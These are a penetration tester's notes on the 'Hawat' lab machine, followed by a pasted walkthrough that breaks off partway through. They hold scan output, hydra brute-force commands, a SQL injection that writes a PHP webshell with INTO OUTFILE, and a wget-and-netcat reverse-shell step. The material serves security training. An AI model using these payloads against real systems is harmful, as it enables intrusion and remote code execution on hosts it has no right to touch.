# Hawat
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh) 
    * [HTTP](#http)
  * [OS](#os)
    * [Nmap OS Discovery Scan](#nmap-os-discovery-scan)
    * [Nmap Scripts Scan](#nmap-scripts-scan)
    * [Nmap Aggresive Scan](#nmap-aggresive-scan)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing) 
    * [Default Credentials](#default-credentials)
    * [Hydra](#hydra)
    * [Patator](#patator)
  * [CVE-2021-1234](#cve-2021-1234) 
    * [EDB-ID-56789](#edb-id-56789)
    * [cyberphor POC](#cyberphor-poc)
    * [Metasploit](#metasploit)
* [Explore](#explore)
* [Escalate](#escalate)
* [Lessons Learned](#lessons-learned)
* [Things I Tried](#things-i-tried)
* [Walkthrough](#walkthrough)

## Summary
* Hostname: hawat
* Description: 1.21 GigHawats
* IP Address: 192.168.198.147
* MAC Address: (ref:)
* Domain: WORKGROUP
* TCP Ports and Services
  * 22
    * OpenSSH 8.4
  * 17445
    * Apache Maven 4.0.0
    * Spring Framework 2.4.2
    * Java 11
  * 30455
    * nginx 1.18 HTTP server
  * 50080
    * Apache HTTP 2.4.46 server
    * PHP 7.4.15 language
    * NextCloud file server
* OS 
  * Distro: (ref:)
  * Kernel: Linux 5.10.14-arch1-1 (ref:)
  * Architecture: (ref:)
* Users
  * root: (ref: 30455/phpinfo.php)
  * admin:admin (ref: 50080/cloud/index.php)
* Vulnerabilities and Exploits
  * CVE-2010-1622 (ref: searchsploit)

# Enumerate
## Setup
```bash
TARGET=192.168.198.147
NAME=hawat
new-ctf $NAME
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 00:51 EDT
Nmap scan report for 192.168.198.147
Host is up (0.088s latency).

PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   unknown
30455/tcp open   http         nginx 1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port17445-TCP:V=7.91%I=7%D=7/6%Time=60E3E146%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,623,"HTTP/1\.1\x20200\x20\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\x20no-cach
SF:e,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x20no-cache
SF:\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text/
SF:html;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Tue,\x2006
SF:\x20Jul\x202021\x2004:51:17\x20GMT\r\nConnection:\x20close\r\n\r\n\n<!D
SF:OCTYPE\x20html>\n<html\x20lang=\"en\">\n\t<head>\n\x20\x20\x20\x20\t<me
SF:ta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20\t<title>Issue\x20Tracker</ti
SF:tle>\n\t\t<link\x20href=\"/css/bootstrap\.min\.css\"\x20rel=\"styleshee
SF:t\"\x20/>\n\t</head>\n\t<body>\n\t\x20\x20\x20\x20<section>\n\t\t<div\x
SF:20class=\"container\x20mt-4\">\n\t\t\t<span>\n\x20\t\t\t\n\t\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<div>\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20h
SF:ref=\"/login\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right\"
SF:>Sign\x20In</a>\x20\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20href=\"/
SF:register\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right;margi
SF:n-right:5px\">Register</a>\n\t\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20</span>\n\t\t\t<br><br>\n\t\t\t<table\x2
SF:0class=\"table\">\n\t\t\t<thead>\n\t\t\t\t<tr>\n\t\t\t\t\t<th>ID</th>\n
SF:\t\t\t\t\t<th>Message</th>\n\t\t\t\t\t<th>P")%r(HTTPOptions,12B,"HTTP/1
SF:\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nX-Content-Type-Options:
SF:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\
SF:x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x
SF:20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Leng
SF:th:\x200\r\nDate:\x20Tue,\x2006\x20Jul\x202021\x2004:51:17\x20GMT\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x20435\r\nDate:\x20Tue,\x2006\x20Jul\x202021\x2004:51:
SF:17\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20lan
SF:g=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,A
SF:rial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-
SF:color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x
SF:20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:blac
SF:k;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</st
SF:yle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Re
SF:quest</h1></body></html>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.85 seconds
```

## Services
### SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://192.168.198.147

# output
NSTR
```

### HTTP
#### Dirb
TCP Port 17445
```bash
dirb http://$TARGET:17445 -z10 -o scans/$NAME-dirb-common-17445

# output
---- Scanning URL: http://192.168.198.147:17445/ ----
+ http://192.168.198.147:17445/login (CODE:200|SIZE:1167)                                                                             
+ http://192.168.198.147:17445/logout (CODE:302|SIZE:0)                                                                               
+ http://192.168.198.147:17445/register (CODE:200|SIZE:1603)
```

TCP Port 30455
```bash
dirb http://$TARGET:30455 -z10 -o scans/$NAME-dirb-common-30455

# output
---- Scanning URL: http://192.168.198.147:30455/ ----
==> DIRECTORY: http://192.168.198.147:30455/4/                                                                                        
+ http://192.168.198.147:30455/index.php (CODE:200|SIZE:3356)                                                                         
+ http://192.168.198.147:30455/phpinfo.php (CODE:200|SIZE:68637)                                                                      
                                                                                                                                      
---- Entering directory: http://192.168.198.147:30455/4/ ----
                                                                                                                                      
-----------------
```

TCP Port 50080
```bash
dirb http://$TARGET:50080 -z10 -o scans/$NAME-dirb-common-50080

# output
---- Scanning URL: http://192.168.198.147:50080/ ----
+ http://192.168.198.147:50080/~bin (CODE:403|SIZE:980)                                                                               
+ http://192.168.198.147:50080/~ftp (CODE:403|SIZE:980)                                                                               
+ http://192.168.198.147:50080/~http (CODE:403|SIZE:980)                                                                              
+ http://192.168.198.147:50080/~mail (CODE:403|SIZE:980)                                                                              
+ http://192.168.198.147:50080/~nobody (CODE:403|SIZE:980)                                                                            
+ http://192.168.198.147:50080/~root (CODE:403|SIZE:980)                                                                              
==> DIRECTORY: http://192.168.198.147:50080/4/                                                                                        
+ http://192.168.198.147:50080/cgi-bin/ (CODE:403|SIZE:994)                                                                           
==> DIRECTORY: http://192.168.198.147:50080/images/                                                                                   
+ http://192.168.198.147:50080/index.html (CODE:200|SIZE:9088)                                                                        
                                                                                                                                      
---- Entering directory: http://192.168.198.147:50080/4/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                      
---- Entering directory: http://192.168.198.147:50080/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
```

#### dirsearch
```bash
dirsearch -u 192.168.198.147:50080

# output
[20:38:29] 301 -  243B  - /cloud  ->  http://192.168.198.147:50080/cloud/                  
[20:38:30] 302 -    0B  - /cloud/  ->  http://192.168.198.147:50080/cloud/index.php/login 
```

#### Nikto
TCP Port 17445
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-17445

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.198.147
+ Target Hostname:    192.168.198.147
+ Target Port:        17445
+ Start Time:         2021-07-06 09:50:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Uncommon header 'content-disposition' found, with contents: inline;filename=f.txt
+ 1352 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-07-06 09:52:33 (GMT-4) (113 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

TCP Port 30455
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-30455

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.198.147
+ Target Hostname:    192.168.198.147
+ Target Port:        30455
+ Start Time:         2021-07-06 09:46:20 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ Retrieved x-powered-by header: PHP/7.4.15
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 1352 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-07-06 09:48:11 (GMT-4) (111 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

TCP Port 50080
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-50080

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.198.147
+ Target Hostname:    192.168.198.147
+ Target Port:        50080
+ Start Time:         2021-07-06 09:47:39 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Unix) PHP/7.4.15
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-637: Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ 1447 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-07-06 09:49:43 (GMT-4) (124 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## OS
### Nmap OS Discovery Scan
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 09:13 EDT
Nmap scan report for 192.168.198.147
Host is up (0.076s latency).
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 3.4 (88%), Linux 3.5 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 3.10 (87%), Linux 4.9 (87%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.17 seconds
```

### Nmap Scripts Scan
```bash
sudo nmap $TARGET -sC -oN scans/$NAME-nmap-scripts

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 09:13 EDT
Nmap scan report for 192.168.198.147
Host is up (0.092s latency).
Not shown: 995 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
111/tcp closed rpcbind
139/tcp closed netbios-ssn
443/tcp closed https
445/tcp closed microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
```

### Nmap Aggressive Scan
```bash
sudo nmap $TARGET -A -oN scans/$NAME-nmap-aggresive

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 09:15 EDT
Nmap scan report for 192.168.198.147
Host is up (0.089s latency).
Not shown: 995 filtered ports
PORT    STATE  SERVICE      VERSION
22/tcp  open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
111/tcp closed rpcbind
139/tcp closed netbios-ssn
443/tcp closed https
445/tcp closed microsoft-ds
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 3.5 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 3.10 (87%), Linux 2.6.39 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   93.97 ms 192.168.49.1
2   94.08 ms 192.168.198.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds
```

# Exploit
## Password Guessing
### Default Credentials
```bash
# CMS Web App 9000
# admin:admin
```

### Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"

# output
NSTR
```

### Patator
```bash
patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
```

## CVE-2021-1234
### EDB-ID-56789
```bash
searchsploit foo
mkdir edb-id-56789
cd edb-id-56789
searchsploit -x 56789
```

### cyberphor POC
```bash
git clone https://github.com/cyberphor/cve-2021-1234-poc.git
cd cve-2021-56789-poc
```

### Metasploit
```bash
msfconsole
search ???
use exploit/???/???
set LHOST tun0
set RHOST $TARGET
run
```

# Explore
```bash
grep -R SELECT ./loot/issuetracker/*

# output
./loot/issuetracker/src/main/java/com/issue/tracker/issues/IssueController.java:                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";

# register
# sign-in
firefox http://192.168.108.147/issue/checkByPriority?priority=Normal
# output

# send again, but as a POST request
POST /issue/checkByPriority?priority=Normal HTTP/1.1
Host: 192.168.108.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=F81E2DF66E5A11B1608C709F6A41B38E
Upgrade-Insecure-Requests: 1

# output
Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.
Wed Jul 07 11:29:43 UTC 2021
There was an unexpected error (type=Method Not Allowed, status=405).

# send again, but create an LFI using SQL injection (NOTE: there's a trailing space to the URI!)
POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+(%3C%3Fphp%20echo%20exec%28%24_GET%5B%22cmd%22%5D%29%3B)+INTO+OUTFILE+'/srv/http/cmd.php';+--+-  HTTP/1.1
Host: 192.168.108.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=F81E2DF66E5A11B1608C709F6A41B38E
Upgrade-Insecure-Requests: 1

# invoke the LFI to confirm the SQLi worked
firefox http://192.168.108.147:30455/cmd.php?cmd=id

# copy the PHP reverse shell to your local directory and serve it
cp /usr/share/webshells/php/php-reverse-shell.php ./rshell.php
vim rshell.php # modify the variables, rport = 443
sudo python3 -m http.server 80

# use the LFI to get the target to download the reverse shell
curl "http://192.168.108.147:30455/cmd.php?cmd=wget http://192.168.49.108/rshell.php"

# invoke the reverse shell
sudo nc -nvlp 443
firefox http://192.168.108.147:30455/rshell.php

```

# Escalate
NSTR

# Lessons Learned
* In Dune, Hawat is the Mentat Master of Assassins who has served House Atreides for multiple generations, until Duke Leto Atreides is killed by a Harkonnen attack.
* 1.21 gigawatts would power more than 10 million light bulbs or one fictional flux capacitor in a time-traveling DeLorean.
* Always enumerate (i.e. HTTP, things with directories) with multiple tools: nmap, dirb, dirsearch, nikto. 
* Look for SQLi vulnerabilities by searching for SQL queries (grep -R SELECT ./*)
* Use time-based SQLi to confirm there is a vulnerability
* Do not jump into exploiting without doing a thorough enumeration of the target
* The proper way to change the HTTP method in Burp Suite is to click-on the Action button and select "Change Method"
* Solution: request url containing the decoded version of the SQL injection, change the request to POST in Burp Suite (should get a 200 response code), request cmd.php? on port 30455, get the target to download a rshell via cmd.php?cmd=wget http:...

# Things I Tried
TCP Port 17445 (Issue Tracker)
```bash
17445: ???; register, login, add users/issues
- LFI
- RFI
- created a user
- changed the password for "clinton" and "dummy" accounts
- logged-in as "clinton","dummy","dork1" accounts
- uploading a file (hello.html, contains "hello"); did not work
  - https://www.arridae.com/blogs/HTTP-PUT-method.php
```

TCP Port 30445 (Sale)
```bash
30445: Nginx 1.18, PHP 7.4.15; /?title=
- LFI
- RFI
- command injection
  - firefox http://192.168.198.147:30455/?title=& ping -c2 192.168.49.198 &
- code injection
  - injecting PHP code into the title parameter via Intruder
```

TCP Port 50080 (Cafe)
```bash
50080: Apache 2.4.6, PHP 7.4.15; HTML text
- LFI
- RFI
- the W3 public website is resolved when i submit a message 
- shows the parameters filled: name, people, message
- this page is one index.html page

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.198.147 -s 50080 http-post-form "/cloud/index.php/login?:user=^USER^&password=^PASS^&timezone=America%2FNew_York&timezone_offset=-4&requesttoken=A7wbgmTEd3kOGamr9QomWCw%2BYIy88Y8i8zwvcDjCTbo%3D%3AV8Us0hCDRRM3dcfjskBIIEQMJs%2BNssluun4aInOHNNs%3D:C=ocsw7w9pqx2n=vkmitrihsod05t49k4lh3gfqdj;oc_sessionPassphrase=87Ra9RuX%2F8sNa12wxQwxqbymCQhh8IakgxAX%2BscFiEKk%2FdHptG5ZAkiqmLM7LEwo39N%2Bx8OTL9cXFmqfxgYcOY53l6K3oizkwWAb3QZer%2Bl%2B%2BFa4b%2F%2Fp4%2FEIFyHolIId;nc_sameSiteCookielax=true;nc_sameSiteCookiestrict=true;JSESSIONID=C7D771FBE2499B064D6CB313639AF192:Wrong username or password."
```

# Walkthrough
* Flag
  * 035ac862d751afa60e77015c4a59c94e
* Hints
  * Enumerate all TCP ports and search for hidden pages. You should find a file server and a configuration file.
  * The credentials for the file server are easy to guess. In it, you will find the source code for one of the web applications.

```bash
Exploitation Guide for Hawat
Summary
In this walkthrough, we will discover the source code for an application.
By analyzing this source code, we will discover an SQL injection vulnerability.
We will use this vulnerability to get remote code execution on the machine, which will lead to a root shell.

Enumeration
Nmap
We’ll begin with an nmap scan.

kali@kali:~$ sudo nmap -p- 192.168.120.130                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 10:15 CST
Nmap scan report for 192.168.120.130
Host is up (0.14s latency).
Not shown: 65527 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   unknown
30455/tcp open   unknown
50080/tcp open   unknown

Nmap done: 1 IP address (1 host up) scanned in 188.29 seconds
kali@kali:~$ sudo nmap -sV -sC -p 22,17445,30455,50080 192.168.120.130
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 10:21 CST
Nmap scan report for 192.168.120.130
Host is up (0.15s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
...
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
...
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
...
|   RTSPRequest: 
|     HTTP/1.1 400 
...
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
30455/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
|_http-title: W3.CSS Template
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
We discover web services on ports 17445, 30455 and 50080.

Web Services
Port 50080
Apart from the fact that this pizza contains some black olives, we don’t find anything interesting on the front page.

Let’s search for hidden pages.

kali@kali:~$ gobuster dir -u http://192.168.120.130:50080 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.120.130:50080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/09 09:32:01 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/4 (Status: 301)
/cgi-bin/ (Status: 403)
/cloud (Status: 301)
/images (Status: 301)
/~bin (Status: 403)
/~ftp (Status: 403)
/~http (Status: 403)
/~root (Status: 403)
/~nobody (Status: 403)
/~mail (Status: 403)
===============================================================
2021/03/09 09:34:03 Finished
===============================================================
In the directory named cloud, we find an installation of NextCloud.



Testing simple credentials (admin:admin), we manage to log in to the application.
Inside, we find IssueTracker.zip, and after opening this archive, we discover the source code of a web application.

Let’s keep exploring the other web services for now.

Port 30455
There is nothing of interest on the front page either, so let’s search for hidden pages here as well.

kali@kali:~$ gobuster dir -u http://192.168.120.130:30455 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.120.130:30455
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/09 14:17:08 Starting gobuster in directory enumeration mode
===============================================================
/4                    (Status: 301) [Size: 169] [--> http://192.168.120.130:30455/4/]
/index.php            (Status: 200) [Size: 3356]
/phpinfo.php          (Status: 200) [Size: 68611]

===============================================================
2021/03/09 14:17:36 Finished
===============================================================
There is a phpinfo.php left over with the entire PHP configuration.

Port 17445
On this port, we find an Issue Tracker application.

kali@kali:~$ curl http://192.168.120.130:17445/            

<!DOCTYPE html>
<html lang="en">
        <head>
        <meta charset="UTF-8">
        <title>Issue Tracker</title>
                <link href="/css/bootstrap.min.css" rel="stylesheet" />
        </head>
        <body>
        ...
The source code we found on NextCloud just became much more interesting.

Giving a quick look at this source code, we identify that the application was developed using Java Spring.
Upon further inspection, we find something interesting in the file IssueController.java.

package com.issue.tracker.issues;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;
import java.util.Optional;
import java.util.Properties;

import javax.persistence.EntityManager;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;

        // ...
        @GetMapping("/issue/checkByPriority")
        public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
                    Statement stmt = conn.createStatement();
                    stmt.executeQuery(query);

        } catch (SQLException e1) {
                        // TODO Auto-generated catch block
                        e1.printStackTrace();
                }

        // TODO: Return the list of the issues with the correct priority
                List<Issue> issues = service.GetAll();
                model.addAttribute("issuesList", issues);
                return "issue_index";
        
        }
        // ...
}
This custom code doesn’t follow the Java Spring conventions to access the database and contains a clear SQL injection vulnerability.

Exploitation
SQL Injection Vulnerability
We can now test our theory. If we navigate to http://192.168.120.130:17445/issue/checkByPriority?priority=Normal, we are greeted by a login page.
We can easily create a user account with the Register button.

With that done, we can try again. We are now greeted by the following error message.

There was an unexpected error (type=Method Not Allowed, status=405).

That is strange, the source code indicates it should accept GET requests.
This means that the source code might have been modified, but let’s simply try a POST request using Burp for now.

This worked. Next, we’ll try a simple SQL injection payload to verify our theory.

POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5);+--+- HTTP/1.1
Host: 192.168.120.130:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=E408CE3E9BBBEC15DCAD194F380E68A9
Upgrade-Insecure-Requests: 1
After sending this request, we notice that the query takes five seconds to execute, which confirms the vulnerability.

The next step is to get code execution.
Using the details extracted from the phpinfo.php file earlier, we know the web root of the PHP server where we can write a reverse shell payload.

$_SERVER['DOCUMENT_ROOT']       /srv/http
Let’s test this theory. We will use the following simple webshell.

<?php echo exec($_GET["cmd"]);
The final payload will look like this.

priority=Normal' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php'; -- 
Using a tool like URL Encoder, we encode the string to be URL-compatible.

